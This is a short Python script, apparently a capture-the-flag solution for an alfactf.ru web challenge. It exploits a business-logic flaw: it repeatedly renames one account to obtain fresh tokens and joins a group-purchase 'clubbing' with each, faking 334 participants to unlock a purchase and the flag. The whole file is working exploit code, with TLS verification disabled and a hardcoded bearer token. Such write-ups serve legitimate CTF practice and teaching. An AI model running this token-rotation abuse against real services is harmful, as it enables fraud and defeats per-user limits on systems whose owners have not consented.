import warnings
import requests
from urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter("ignore", InsecureRequestWarning)

url = "https://youtroopers-4me3mn03.alfactf.ru/"

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

# register first as a user and get the token
headers = {
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJibGFibGFibGFibGFibGFibGFibGFibGFibGFibGEiLCJleHAiOjE3NTc4NTg5NzZ9.BDVJbg9XiwGRdMWM7YTseKzXhRzquIz5fx7vlIPj8cA"
}

res = requests.post(url+"/api/create_clubbing", verify=False, headers=headers, json={"product": "Высокоскоростной роутер SeaLink X20"}, proxies=proxies)
res = requests.get(url+"/api/clubbings", verify=False, headers=headers, proxies=proxies)
clubbing_id = res.json()[0]["clubbing_id"]
print(clubbing_id)

for i in range(0, 334):
    res = requests.post(url+"/api/rename", verify=False, headers=headers, json={"new_username": f"idkidkidkidkidk{i}"}, proxies=proxies)
    new_token = res.json()["access_token"]
    old_token = headers["Authorization"].split(" ")[1]

    res = requests.post(url+'/api/join_clubbing', verify=False, headers=headers, json={"clubbing_id": clubbing_id}, proxies=proxies)

    headers["Authorization"] = f"Bearer {new_token}"

# after the script is done running, in the web view join the clubbing using the printed clubbing_id and buy the item to get the flag